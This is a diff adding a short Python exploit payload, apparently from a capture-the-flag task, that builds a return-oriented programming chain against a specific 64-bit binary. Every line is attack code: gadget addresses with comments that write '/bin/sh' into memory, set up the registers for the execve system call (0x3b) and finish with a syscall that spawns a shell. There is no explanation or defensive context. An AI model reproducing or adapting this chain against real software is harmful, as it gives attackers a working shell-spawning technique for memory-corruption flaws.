@@ -1,0 +1,25 @@
+payload = p64(0x40aec9)
+#0x000000000040aec9: pop rsi; ret; 
+payload += p64(0x49c2a1)+p64(0x43a3f6)
+# 0x000000000043a3f6: pop rdi; adc byte ptr [rsi - 0x3f], ah; ret; 
+payload += p64(0x49c070)+p64(0x40aec9)
+# 0x000000000040aec9: pop rsi; ret; 
+payload += p64(0x68662f6e69622f)+p64(0x44d1b6)
+# 0x000000000044d1b6: mov qword ptr [rdi], rsi; ret; 
+payload += p64(0x40aec9)
+# 0x000000000040aec9: pop rsi; ret; 
+payload += p64(0x0)+p64(0x44b386)
+# 0x000000000044b386: imul edx, esi, 0x8948fffb; ret; 
+payload += p64(0x409678)
+# 0x0000000000409678: pop rbx; ret; 
+payload += p64(0x3b)+p64(0x44d530)
+# 0x000000000044d530: mov eax, ebx; ret; 
+payload += p64(0x40aec9)
+# 0x000000000040aec9: pop rsi; ret; 
+payload += p64(0x49c1d3)+p64(0x43a3f6)
+# 0x000000000043a3f6: pop rdi; adc byte ptr [rsi - 0x3f], ah; ret; 
+payload += p64(0x49c070)+p64(0x40aec9)
+# 0x000000000040aec9: pop rsi; ret; 
+payload += p64(0x0)+p64(0x419b71)
+# 0x0000000000419b71: syscall; 
+payload += b''
